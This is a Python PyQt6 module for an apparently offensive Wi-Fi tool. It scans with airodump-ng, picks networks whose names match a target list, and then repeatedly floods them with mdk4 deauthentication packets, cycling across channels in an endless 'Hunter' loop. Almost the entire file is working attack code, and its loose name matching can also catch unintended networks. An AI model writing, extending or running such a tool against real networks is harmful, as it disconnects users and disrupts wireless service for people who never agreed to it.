import subprocess
import os
import time
import tempfile
import shutil
from PyQt6.QtCore import QThread, pyqtSignal
from .utils import parse_airodump_csv

class AirodumpScanner(QThread):
    # ... (signals remain same)
    networks_found = pyqtSignal(list, list) 

    def __init__(self, interface):
        super().__init__()
        self.interface = interface
        self.process = None
        self.running = False
        self.temp_dir = tempfile.mkdtemp()
        self.csv_prefix = os.path.join(self.temp_dir, "scan")
        
    def run(self):
        self.running = True
        cmd = [
            "airodump-ng",
            "--band", "abg", 
            "-w", self.csv_prefix,
            "--output-format", "csv",
            "--write-interval", "1", 
            self.interface
        ]
        
        try:
            self.process = subprocess.Popen(
                cmd, 
                stdout=subprocess.DEVNULL, 
                stderr=subprocess.DEVNULL,
                preexec_fn=os.setsid 
            )
            
            csv_file = f"{self.csv_prefix}-01.csv"
            
            while self.running:
                if os.path.exists(csv_file):
                    # Use utility function
                    networks, clients = parse_airodump_csv(csv_file)
                    if networks or clients:
                        self.networks_found.emit(networks, clients)
                        
                time.sleep(2.5) 
                
        except Exception as e:
            print(f"Error starting airodump: {e}")
        finally:
            self.cleanup()

    # parse_csv removed (moved to utils)

    def stop(self):
        self.running = False
        if self.process:
            try:
                os.killpg(os.getpgid(self.process.pid), 15) 
                self.process.wait()
            except:
                pass
        self.wait()
        self.cleanup()

    def cleanup(self):
        if os.path.exists(self.temp_dir):
            shutil.rmtree(self.temp_dir, ignore_errors=True)

class HunterThread(QThread):
    # ... (signals and init remain same)
    status_update = pyqtSignal(str)
    stats_update = pyqtSignal(str)
    
    def __init__(self, interface, target_essids, speed=None, scan_duration=15):
        super().__init__()
        self.interface = interface
        self.target_essids = set(target_essids)
        self.speed = speed
        self.running = False
        self.scanner = None
        self.attacker = None
        
        # Config
        self.scan_duration = scan_duration 
        self.initial_scan_duration = max(45, scan_duration * 3) # Ensure thorough first scan
        self.attack_duration = 60 
        self.temp_dir = tempfile.mkdtemp()
        
        # Memory of targets {BSSID: Channel}
        self.known_targets = {}
        
    def run(self):
        self.running = True
        first_run = True
        
        while self.running:
            try:
                # --- Phase 1: SCAN ---
                duration = self.initial_scan_duration if first_run else self.scan_duration
                self.status_update.emit(f"Hunter: Scanning for targets ({duration}s)...")
                self.stats_update.emit("")
                
                self.scanner = AirodumpScanner(self.interface)
                self.scanner.start()
                
                # Wait for scan duration
                for _ in range(duration):
                    if not self.running: break
                    time.sleep(1)
                
                first_run = False
                
                # Read results
                if self.scanner:
                    csv_file = f"{self.scanner.csv_prefix}-01.csv"
                    if os.path.exists(csv_file):
                        networks, _ = parse_airodump_csv(csv_file)
                        
                        # Fresh start every scan (No blind attack)
                        current_scan_targets = {}
                        
                        for net in networks:
                            net_essid = net['ESSID']
                            net_bssid = net['BSSID']
                            net_channel = net['Channel']
                            
                            is_target = False
                            
                            # Check if it matches our Target ESSID List
                            for target in self.target_essids:
                                if target == net_essid or (target in net_essid and len(target) > 3):
                                     is_target = True
                                     break
                            
                            if is_target:
                                current_scan_targets[net_bssid] = net_channel
                        
                        # Update the main known_targets list to strictly reflect current reality
                        self.known_targets = current_scan_targets
                        
                        if self.known_targets:
                            self.status_update.emit(f"Hunter: Found {len(self.known_targets)} active targets.")
            
            except Exception as e:
                print(f"Hunter scan error: {e}")
            finally:
                if self.scanner:
                    self.scanner.stop()
                    self.scanner.wait()
                    self.scanner = None

            if not self.running: break

            # --- Phase 2: ATTACK ---
            if self.known_targets:
                try:
                    # Prepare targets list from MEMORY
                    target_list = []
                    for bssid, channel in self.known_targets.items():
                        target_list.append((bssid, channel))
                    
                    channels = set(self.known_targets.values())
                    msg = f"Hunter: Attacking {len(target_list)} targets on ch {', '.join(channels)}..."
                    self.status_update.emit(msg)
                    
                    # Start Attacker with list
                    self.attacker = Mdk4Attacker(self.interface, target_list, self.speed)
                    self.attacker.stats_update.connect(self.stats_update)
                    self.attacker.start()
                    
                    # Attack loop
                    for _ in range(self.attack_duration):
                        if not self.running: break
                        time.sleep(1)
                        
                except Exception as e:
                    print(f"Hunter attack error: {e}")
                finally:
                    if self.attacker:
                        self.attacker.stop()
                        self.attacker.wait()
                        self.attacker = None
            else:
                self.status_update.emit("Hunter: No targets found yet. Retrying...")
                time.sleep(1)

    # find_targets_in_csv removed (logic moved to run loop using util)

    def stop(self):
        self.running = False
        
        # Capture references locally to avoid race conditions
        scanner = self.scanner
        if scanner:
            scanner.stop()
            scanner.wait()
            
        attacker = self.attacker
        if attacker:
            attacker.stop()
            attacker.wait()
            
        self.wait()
        self.cleanup()

    def cleanup(self):
        if os.path.exists(self.temp_dir):
            shutil.rmtree(self.temp_dir, ignore_errors=True)

class Mdk4Attacker(QThread):
    """
    Runs mdk4 attacks using Time Division Multiplexing for multi-channel targets.
    """
    finished = pyqtSignal(str)
    stats_update = pyqtSignal(str)

    def __init__(self, interface, targets, speed=None):
        """
        targets: List of tuples [(bssid, channel), ...]
        """
        super().__init__()
        self.interface = interface
        self.targets = targets 
        self.speed = speed
        self.running = False
        self.processes = [] # List of active processes
        self.current_channel_index = 0
        
    def format_bytes(self, size):
        power = 2**10
        n = 0
        power_labels = {0 : '', 1: 'K', 2: 'M', 3: 'G', 4: 'T'}
        while size > power:
            size /= power
            n += 1
        return f"{size:.2f} {power_labels[n]}B"
        
    def run(self):
        self.running = True
        
        # Group targets by channel
        # { "1": [bssid1, bssid2], "6": [bssid3] }
        channel_groups = {}
        for bssid, channel in self.targets:
            if channel not in channel_groups:
                channel_groups[channel] = []
            channel_groups[channel].append(bssid)
            
        channels = list(channel_groups.keys())
        
        if not channels:
            self.finished.emit("No targets")
            return

        # Constants
        PACKET_SIZE = 64
        effective_speed = self.speed if self.speed else 500
        start_time = time.time()
        
        try:
            while self.running:
                # Cycle through channels
                for channel in channels:
                    if not self.running: break
                    
                    # 1. Switch Interface Channel
                    subprocess.run(["iwconfig", self.interface, "channel", channel], 
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                                  
                    # 2. Prepare Blacklist for this channel
                    target_bssids = channel_groups[channel]
                    
                    # We create a temp file for this batch
                    import tempfile
                    with tempfile.NamedTemporaryFile(mode='w', delete=False) as tmp:
                        blacklist_path = tmp.name
                        for bssid in target_bssids:
                            tmp.write(f"{bssid}\n")
                            
                    # 3. Start mdk4 for this channel
                    cmd = [
                        "mdk4",
                        self.interface,
                        "d",
                        "-b", blacklist_path,
                        "-c", channel
                    ]
                    if self.speed:
                        cmd.extend(["-s", str(self.speed)])
                        
                    proc = subprocess.Popen(
                        cmd,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        preexec_fn=os.setsid
                    )
                    
                    # 4. Attack Duration for this channel (Time Slice)
                    # If only 1 channel, we just sleep 1s and loop (continuous)
                    # If multiple, we give each 2 seconds
                    slice_time = 2 if len(channels) > 1 else 1
                    
                    for _ in range(slice_time * 2): # check every 0.5s
                        if not self.running: break
                        time.sleep(0.5)
                        
                        # Update stats
                        elapsed = time.time() - start_time
                        total_packets = int(effective_speed * elapsed)
                        total_bytes = total_packets * PACKET_SIZE
                        speed_bytes = effective_speed * PACKET_SIZE
                        
                        self.stats_update.emit(f"~{self.format_bytes(speed_bytes)}/s | Total: ~{self.format_bytes(total_bytes)}")

                    # 5. Stop Process
                    try:
                        os.killpg(os.getpgid(proc.pid), 15)
                        proc.wait()
                    except:
                        pass
                    
                    # Cleanup
                    try:
                        os.remove(blacklist_path)
                    except:
                        pass
                        
        except Exception as e:
            print(f"Attack error: {e}")
            
        self.finished.emit("Attack Stopped")

    def stop(self):
        self.running = False
        self.wait()

    def get_tx_bytes(self):
        return 0 # Deprecated
